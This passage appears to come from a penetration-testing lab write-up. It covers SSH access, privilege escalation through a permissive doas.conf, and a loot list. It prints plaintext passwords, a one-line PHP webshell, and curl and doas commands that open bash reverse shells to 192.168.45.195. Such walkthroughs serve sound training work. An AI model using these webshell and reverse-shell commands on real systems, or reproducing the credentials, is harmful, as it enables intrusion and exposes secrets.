- Use the SSH password `Rb9kNokjDsjYyH` for `andrew` found in `19` to obtain a SSH session.
# PrivEsc
- looking at `doas.conf`, one can identify that `andrew` can run `doas -u service apache24 onestart` without password and any member in `wheel` group can run any command as `root` without password.![[Pasted image 20240223192503.png]]
- Further enumeration can identify that `www` is within `wheel` group and we have started `apache` server already. Now, use `find /usr/local/www/ -type d  -perm 777`  to find the `/usr/local/www/apache24/data/phpMyAdmin/tmp` directory as writable by `andrew`.![[Pasted image 20240223193313.png]]
- Navigate to the writable directory and run `echo "<?php echo system(\$_REQUEST['cmd']); ?>" > webshell.php`.
- Finally run `proxychains -q curl http://172.16.110.20/phpMyAdmin/tmp/webshell.php?cmd=bash%20-c%20%22%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.195%2F443%200%3E%261%22` to receive a reverse shell as `www`.
- Run as `www` `/usr/local/bin/doas -u root bash -c "/bin/bash -i >& /dev/tcp/192.168.45.195/443 0>&1"` to receive a reverse shell as `root`.
# Loot
- `mountuser`: DRtajyCwcbWvH/9
	- Creds to host `21`